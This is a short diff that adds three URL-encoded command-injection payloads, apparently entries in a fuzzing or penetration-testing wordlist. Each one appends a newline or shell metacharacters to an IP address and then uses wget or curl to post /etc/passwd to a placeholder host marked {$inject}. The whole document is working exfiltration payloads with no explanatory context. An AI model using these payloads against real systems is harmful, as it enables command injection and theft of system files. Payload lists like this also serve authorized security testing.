@@ -1,0 +1,3 @@
+127.0.0.1%0awget --post-file /etc/passwd {$inject}
+127.0.0.1%0Acurl+-T+/etc/passwd+{$inject}
+'%22%600%26curl%20-X%20POST%20-F%20%22lala%3D%40%2Fetc%2Fpasswd%22%20{$inject}.%26%60'
